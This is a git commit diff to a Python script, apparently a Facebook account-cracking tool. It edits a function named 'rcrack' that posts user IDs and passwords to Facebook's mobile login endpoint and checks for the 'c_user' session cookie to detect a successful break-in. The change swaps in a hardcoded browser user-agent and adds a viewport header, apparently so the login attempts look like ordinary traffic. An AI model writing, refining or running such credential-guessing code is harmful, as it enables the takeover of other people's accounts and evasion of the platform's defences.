79961837364ce11f02e06d9200f86d908cba0e60
Shihab Rana <139139223+shihab99s@users.noreply.github.com>
2023-10-05 13:21:29 +0600

    SHIHAB-RNDM.py

--- SHIHAB-RNDM.py
+++ SHIHAB-RNDM.py
@@ -249,7 +249,8 @@ def rcrack(uid,pwx,tl):
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
-          'user-agent': pro }
+          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+          'viewport-width': '980',}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
